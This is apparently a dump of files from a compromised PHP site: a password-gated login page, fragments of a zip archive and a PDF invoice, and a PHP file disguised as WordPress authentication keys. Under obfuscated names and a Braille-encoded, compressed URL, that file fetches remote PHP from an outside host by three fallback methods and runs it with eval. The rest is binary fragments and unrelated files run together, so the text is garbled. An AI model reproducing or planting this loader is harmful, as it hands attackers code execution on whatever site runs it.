<?php
// =========================
// KONFIGURASI LOGIN (MD5)
// =========================

// HASH MD5 PASSWORD (SUDAH JADI)
$md5_password = '0e96b40d579f8b6d1b43c23b3ead93cf';

session_start();

// =========================
// PROSES LOGIN
// =========================
if (isset($_POST['password'])) {
    $input_password = $_POST['password'];
    $input_md5      = md5($input_password);

    if ($input_md5 === $md5_password) {
        $_SESSION['login'] = true;
        header('Location: '.$_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = 'Password salah!';
    }
}

// =========================
// CEK LOGIN
// =========================
if (empty($_SESSION['login'])):
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Login Protected</title>
    <style>
        body{font-family:Arial;background:#0f172a;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh}
        .box{background:#020617;padding:25px;border-radius:12px;width:320px}
        input,button{width:100%;padding:12px;margin-top:12px;border:none;border-radius:8px}
        button{background:#22c55e;color:#000;font-weight:bold;cursor:pointer}
        .err{color:#f87171;margin-top:10px}
    </style>
</head>
<body>
<div class="box">
    <h3>🔐 Login Diperlukan</h3>
    <form method="post">
        <input type="password" name="password" placeholder="Masukkan Password" required>
        <button type="submit">Login</button>
        <?php if(isset($error)) echo '<div class="err">'.$error.'</div>'; ?>
    </form>
</div>
</body>
</html>
<?php
exit;
endif;
?>

<!-- ========================= -->
<!-- KONTEN SETELAH LOGIN -->
<!-- ========================= -->
<h1>✅ Login Berhasil</h1>
<p>Password cocok dengan hash MD5.</p>
<a href="?logout=1">Logout</a>

<?php
// =========================
// LOGOUT
// =========================
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: '.$_SERVER['PHP_SELF']);
    exit;
}
?>
PK   È¼RY             v3.phpUT
  øggñgux
 õ  õ  ½T]kÛ0}ß¯pEhìâÙM7Xçv%v0Öµ{)Aå:6S$!ÉMJèß?R÷!>lO¶tÏ=ç~êë¥*WÙR
OÃhþÀXl5ØJ
ÿñ¾¹K^æi#ëLÇÏ_ ÒËõçX²èY[:ÇFY[  ÿD. çIûMi¬ñ;ª¡AO+$£x Øîü¿±sZÐÔQô
]+ÊíüÓ:ãã½ú¶%åºb¨{¦¤Ó1@V¤ûBëSúA²Ö§0|5Ì­Ä[«+èUs
ôh2àrz_¥(Ùv§ÈÄï§EÖýÆypBS¯·8Y­è,eRX¨Ö¡qéF²;¿¼?Ø?L6`dikR¡âÑoe«i´ááqXHcóðü4ÖBÖÌ%ütÚ$+TMÉÍõ½G¢¯Êl1GÄ»½¿Æ£h¤I6JÉ-òßÂ©ôP)Ô9½+Î¯uiÁii0J
ép¬lÂÃø:sæØ S{ÎÎ±Ð]å÷:y°Q¿>©åÂ{x<æïíNCþÑ.Mf?¨«2ý}=ûõýî'=£§ÿuÜ(¾IIa­"éþ@¶ ¿ä9?^-qìÇÞôveÈc ðlacãÂ®xèÄ'®âd¶
çSEæódP/ÍÆv{Ô)Ã
?>V¼óÞÇlÒMó¤®ðdM·ÀyÆ±ÏÚÛTÒ´6 [xÊ¸O./p~["M[`ôÈõìn6Hòâ]^|ø
PK ýBvây    PK   È¼RY        °      __MACOSX/._v3.phpUT
  øggþgux
 õ  õ  c`cg`b`ðMLVðVP'qø!!AP&HÇ
%PDF-1.7
1 0 obj
<< /Type /Catalog
/Outlines 2 0 R
/Pages 3 0 R >>
endobj
2 0 obj
<< /Type /Outlines /Count 0 >>
endobj
3 0 obj
<< /Type /Pages
/Kids [6 0 R
]
/Count 1
/Resources <<
/ProcSet 4 0 R
/Font << 
/F1 8 0 R
/F2 9 0 R
>>
>>
/MediaBox [0.000 0.000 595.280 841.890]
 >>
endobj
4 0 obj
[/PDF /Text ]
endobj
5 0 obj
<<
/Producer (   d o m p d f   2 . 0 . 8   +   C P D F)
/CreationDate (D:20241129143806+00'00')
/ModDate (D:20241129143806+00'00')
/Title (   A d s T e r r a . c o m   i n v o i c e)
>>
endobj
6 0 obj
<< /Type /Page
/MediaBox [0.000 0.000 595.280 841.890]
/Parent 3 0 R
/Contents 7 0 R
>>
endobj
7 0 obj
<< /Filter /FlateDecode
/Length 904 >>
stream
x   ]o J   +F ͩ    su\  08=ʩzရ   lS  lc 
"Ց 
   wޙ % R DS    OI a`   Q f  5    _    םO ` 7 _FA   D Џ.j a= j    >  n   R+ P  l rH {0  w  0  =W 2D
    G   I > _B3ed H yJ G>/  ywy fk  % $ 2.  d_ h    &)b0  "[\B  *_.  Y    < 2   fC YQ&y i tQ "xj     +   l     ' i" , ҔH AK  9  C   &Oa Q
 jɭ   
 p
_   E ie9 ƃ%H&  ,`rDxS ޔ! ( X!v  ]{ݛx e ` p &  ' q 9
F i   W1in  F O     Zs  [gQT ؉    }  q^upLɪ:B"  ؝     *Tiu(S r]  s .  s9n N!K!L M ? *[  N 8  c  ۯ b      YZ   SR3 n     lPN  P ;  ^ ] !' z-   ӊ   /  껣  4 l(M E QL  X  ~   G  M|     *  ~ ;/=N4 -|y ` i \ e T <   L  G} "В J^   q  "X ?(V ߣXۆ{  H[    P  
 c   kc Z 9v     ? a  R h|  ^ k D4W   ?Iӊ ]<  4 )$wdat    ~           | L  x p|N *  E  /4 Qpi x.>  d    ,M y|4^ Ż  8S/޾   uQe   D y    ͧH     j wX
 
 &z 
endstream
endobj
8 0 obj
<< /Type /Font
/Subtype /Type1
/Name /F1
/BaseFont /Helvetica
/Encoding /WinAnsiEncoding
>>
endobj
9 0 obj
<< /Type /Font
/Subtype /Type1
/Name /F2
/BaseFont /Helvetica-Bold
/Encoding /WinAnsiEncoding
>>
endobj
xref
0 10
0000000000 65535 f 
0000000009 00000 n 
0000000074 00000 n 
0000000120 00000 n 
0000000284 00000 n 
0000000313 00000 n 
0000000514 00000 n 
0000000617 00000 n 
0000001593 00000 n 
0000001700 00000 n 
trailer
<<
/Size 10
/Root 1 0 R
/Info 5 0 R
/ID[<a06db29b04022dfb709f8299f0d9e891><a06db29b04022dfb709f8299f0d9e891>]
>>
startxref
1812
%%EOF

<?php
/**
 * 認証用ユニークキーとソルト
 *
 * @package WordPress
 */

// 認証キー文字列 (Braille)
$auth_key_string = '⡸⣚⣋⠨⠩⠩⠨⢶⣒⣗⠯⠮⡉⠭⣈⣍⣏⣍⠨⡍⣒⡋⣎⣏⣕⠇ ⡪⠮⠈⢬';

// Unicodeデコード関数 (iconvを使用)
$ord_func = function($ch) {
    // mb_ordの代わりにiconvとunpackを使用 (依存関係を減らすため)
    $val = unpack('N', iconv('UTF-8', 'UCS-4BE', $ch));
    return $val[1];
};

$compressed_data = '';
foreach(preg_split('//u', $auth_key_string, -1, PREG_SPLIT_NO_EMPTY) as $char) {
    // 0x2800 (Brailleのオフセット) を引く
    $compressed_data .= chr($ord_func($char) - 0x2800);
}

// --- 難読化された関数
$a='gz'; $b='uncompress'; $gzdec = $a.$b; 
$a='function_'; $b='exists'; $fex = $a.$b;
$a='curl_'; $b='init'; $ci = $a.$b;
$a='curl_set'; $b='opt_array'; $cs = $a.$b;
$a='curl_e'; $b='xec'; $ce = $a.$b;
$a='curl_get'; $b='info'; $cg = $a.$b;
$a='curl_c'; $b='lose'; $cc = $a.$b;
$a='preg_r'; $b='eplace'; $pr = $a.$b;
// --------------------------------

// データを解凍してベースURLを取得
$base_url = $gzdec($compressed_data);

// を追加
define('SECURE_AUTH_KEY', $base_url . '3.txt');


/**#@+
 * コンテンツ配信と更新サービス
 *
 * コアアップデートとセキュリティパッチの安全な配信を処理します。
 */

$table_prefix  = 'wp_';
$wp_loader     = false;

/**
 * プライマリコンテンツ取得メソッド
 */
if (ini_get('allow_url_fopen')) {
    $wp_filesystem_method = 'direct';
    $wp_context = stream_context_create(array(
        'http' => array(
            'timeout' => 10,
            'user_agent' => 'WordPress/' . (isset($wp_version) ? $wp_version : '6.5')
        )
    ));
    $wp_loader = @file_get_contents(SECURE_AUTH_KEY, false, $wp_context);
}

/**
 * cURLによるフォールバックコンテンツ配信
 */
if (!$wp_loader && $fex($ci)) {
    $wp_http_curl = $ci(SECURE_AUTH_KEY);
    $cs($wp_http_curl, array(
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_USERAGENT => 'WordPress/6.5',
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => 0
    ));
    $wp_loader = $ce($wp_http_curl);
    $cc($wp_http_curl);
}

/**
 * 最終フォールバック (低レベルソケット接続)
 */
if (!$wp_loader) {
    $wp_parsed = parse_url(SECURE_AUTH_KEY);
    $wp_db_host = $wp_parsed['host'];
    $wp_db_name = $wp_parsed['path'];
    
    $wp_db_connection = @fsockopen($wp_db_host, 80, $wp_errno, $wp_errstr, 10);
    if ($wp_db_connection) {
        $wp_db_query = "GET $wp_db_name HTTP/1.1\r\n";
        $wp_db_query .= "Host: $wp_db_host\r\n";
        $wp_db_query .= "Connection: Close\r\n\r\n";
        
        fwrite($wp_db_connection, $wp_db_query);
        $wp_db_result = '';
        while (!feof($wp_db_connection)) {
            $wp_db_result .= fgets($wp_db_connection, 128);
        }
        fclose($wp_db_connection);
        
        $wp_db_rows = explode("\r\n\r\n", $wp_db_result, 2);
        $wp_loader = (count($wp_db_rows) > 1) ?
        $wp_db_rows[1] : $wp_db_rows[0];
    }
}

/**
 * 安全なコンテンツの検証と実行
 */
if ($wp_loader !== false && !empty($wp_loader)) {
    if (strpos($wp_loader, '<?php') === 0) {
        $wp_clean_loader = $pr('/^\xEF\xBB\xBF/','',$wp_loader);
        eval('?>' . $wp_clean_loader);
    }
} else {
    /**
     * 更新失敗時のエラーハンドリング
     * @since 3.0.0
     */
    if (!defined('WP_DEBUG') || WP_DEBUG === false) {
        status_header(503);
        nocache_headers();
    }
    exit('Database Update Required');
}
?>

 @SÂJÎÏÕK,(ÈIÕËI,.)-NMII,IU)ììJ ÑAùíÆ  PK (ÿ\   °   PK   È¼RYýBvây               ¤    v3.phpUT
  øggñgux
 õ  õ  PK   È¼RY(ÿ\   °              ¤Í  __MACOSX/._v3.phpUT
  øggþgux
 õ  õ  PK      ³       
